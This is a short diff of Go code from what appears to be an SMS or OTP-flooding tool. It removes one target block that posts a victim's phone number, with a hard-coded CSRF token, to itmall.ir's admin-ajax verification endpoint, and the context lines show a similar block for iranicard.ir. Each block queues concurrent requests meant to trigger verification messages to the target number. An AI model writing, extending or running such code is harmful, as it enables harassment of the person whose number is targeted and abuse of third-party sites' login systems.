@@ -1840,26 +1840,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// itmall.ir (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "digits_check_mob")
-				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone)
-				formData.Set("csrf", "e57d035242")
-				formData.Set("login", "2")
-				formData.Set("username", "")
-				formData.Set("email", "")
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
 		// iranicard.ir (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
